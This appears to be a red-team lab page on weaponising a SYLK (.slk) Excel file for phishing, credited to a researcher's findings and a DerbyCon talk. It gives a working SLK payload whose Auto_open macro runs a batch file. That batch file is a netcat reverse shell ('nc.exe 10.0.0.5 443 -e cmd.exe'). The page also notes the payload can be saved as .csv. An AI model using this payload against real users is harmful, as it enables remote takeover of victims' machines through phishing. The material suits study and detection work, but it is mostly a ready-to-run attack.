# Phishing: .SLK Excel

## Phishing: .SLK Excel

This lab is based on findings by [@StanHacked](https://twitter.com/StanHacked) - see below references for more info.

### Weaponization

Create an new text file, put the the below code and save it as .slk file:

{% code title="demo.slk" %}
```csharp
ID;P
O;E
NN;NAuto_open;ER101C1;KOut Flank;F
C;X1;Y101;K0;EEXEC("c:\shell.cmd")
C;X1;Y102;K0;EHALT()
E
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOJRIRc4AJ67oriI2KQ%2F-LOJSgqp-qR_GZX4P9jG%2Fslk-text.png?alt=media\&token=70255e9a-9a11-4101-a1df-5f3059624815)

Note that the shell.cmd refers to a simple nc reverse shell batch file:

{% code title="c:\shell.cmd" %}
```csharp
C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
```
{% endcode %}

### Execution

Once the macro warning is dismissed, the reverse shell pops as expected:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOJRIRc4AJ67oriI2KQ%2F-LOJSz28-nIUjeIJAv-h%2Fslk-shell.gif?alt=media\&token=a3aa5596-f313-46ca-991b-b5e26846a223)

Since the file is actually a plain text file, detecting/triaging malicious intents are made easier.

### Bonus

Note that the payload file could be saved as a .csv - note the additional warning though:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOJV2oLk8wWrH2w7LnA%2F-LOJUyhhL0XRD-eeip9M%2Fslk-csv.png?alt=media\&token=13cd29c6-08de-44c3-8457-2425b6f2f339)

### References

[http://www.irongeek.com/i.php?page=videos/derbycon8/track-3-18-the-ms-office-magic-show-stan-hegt-pieter-ceelen](http://www.irongeek.com/i.php?page=videos/derbycon8/track-3-18-the-ms-office-magic-show-stan-hegt-pieter-ceelen)
